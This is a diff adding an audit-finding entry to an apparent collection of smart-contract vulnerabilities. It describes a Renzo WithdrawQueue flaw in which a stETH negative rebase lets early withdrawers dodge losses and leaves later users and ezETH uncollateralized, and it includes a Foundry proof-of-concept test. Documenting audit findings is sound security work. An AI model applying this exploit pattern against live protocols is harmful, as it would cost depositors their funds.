@@ -1595,3 +1595,80 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
   </details>
+
+## 13.[High] Withdrawals of rebasing tokens can lead to insolvency and unfair distribution of protocol reserves
+
+### Rebasing tokens
+
+- Summary: The current withdrawal mechanism for rebasing tokens like stETH can lead to users receiving a larger share of reserves than intended after a rebasing event, resulting in unfair distribution and potential transaction failures if the contract’s balance is insufficient to cover all pending withdrawals.
+
+- Impact & Recommendation: To fix the unfair distribution of funds with rebasing tokens like stETH, the WithdrawQueue contract should handle withdrawals as stETH shares instead of fixed amounts. When a user withdraws, convert the amount to stETH shares and store this. Upon claiming, transfer the shares directly.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-04-renzo#h-05-withdrawals-of-rebasing-tokens-can-lead-to-insolvency-and-unfair-distribution-of-protocol-reserves) & [Report](https://code4rena.com/reports/2024-04-renzo)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+    pragma solidity ^0.8.19;
+    import "contracts/Errors/Errors.sol";
+    import "./Setup.sol";
+    contract H6 is Setup {
+        function testH6() public {
+            // we set the buffer to something reasonably high
+            WithdrawQueueStorageV1.TokenWithdrawBuffer[] memory buffers = new WithdrawQueueStorageV1.TokenWithdrawBuffer[](2);
+            buffers[0] = WithdrawQueueStorageV1.TokenWithdrawBuffer(address(stETH), 100e18 - 1);
+            buffers[1] = WithdrawQueueStorageV1.TokenWithdrawBuffer(address(cbETH), 100e18 - 1);
+            vm.startPrank(OWNER);
+            withdrawQueue.updateWithdrawBufferTarget(buffers);
+            // we'll be using stETH and cbETH with unitary price for simplicity
+            stEthPriceOracle.setAnswer(1e18);
+            cbEthPriceOracle.setAnswer(1e18);
+            // and we start with 0 TVL
+            (, , uint tvl) = restakeManager.calculateTVLs();
+            assertEq(0, tvl);
+            // let's then imagine that Alice and Bob hold 90 and 10 ezETH each
+            address alice = address(1234567890);
+            address bob = address(1234567891);
+            stETH.mint(alice, 100e18);
+            vm.startPrank(alice);
+            stETH.approve(address(restakeManager), 100e18);
+            restakeManager.deposit(IERC20(address(stETH)), 100e18);
+            ezETH.transfer(bob, 10e18);
+            // ✅ TVL and balance are as expected
+            (, , tvl) = restakeManager.calculateTVLs();
+            assertEq(100e18, tvl);
+            assertEq(90e18, ezETH.balanceOf(alice));
+            assertEq(10e18, ezETH.balanceOf(bob));
+            // Now Bob initiates withdrawal of their shares
+            vm.startPrank(bob);
+            ezETH.approve(address(withdrawQueue), 10e18);
+            withdrawQueue.withdraw(10e18, address(stETH));
+            // Alice, too, initiates withdrawal of their shares
+            vm.startPrank(alice);
+            ezETH.approve(address(withdrawQueue), 90e18 - 1);
+            withdrawQueue.withdraw(90e18 - 1, address(stETH));
+            // ☢️ time passes, and an stETH negative rebasing happens, wiping
+            // 10% of the balance
+            vm.startPrank(address(withdrawQueue));
+            stETH.transfer(address(1), 10e18);
+            vm.warp(block.timestamp + 10 days);
+            // 🚨 now, since WithdrawQueue checked availability at withdrawal initiation
+            // only and didn not account for the possibility of rebases, the 10% loss
+            // has been completely dodged by Alice and is attributed to the last
+            // user exiting.
+            vm.startPrank(alice);
+            withdrawQueue.claim(0);
+            assertEq(90e18 - 1, stETH.balanceOf(alice));
+            // 🚨 not only Bob can't withdraw
+            vm.startPrank(bob);
+            vm.expectRevert();
+            withdrawQueue.claim(0);
+            // 🚨 but ezETH as a whole also became completely uncollateralized
+            assertEq(10e18 + 1, ezETH.totalSupply());
+            (, , tvl) = restakeManager.calculateTVLs();
+            assertEq(1, tvl);
+        }
+    }
+
+  ```
+
+  </details>
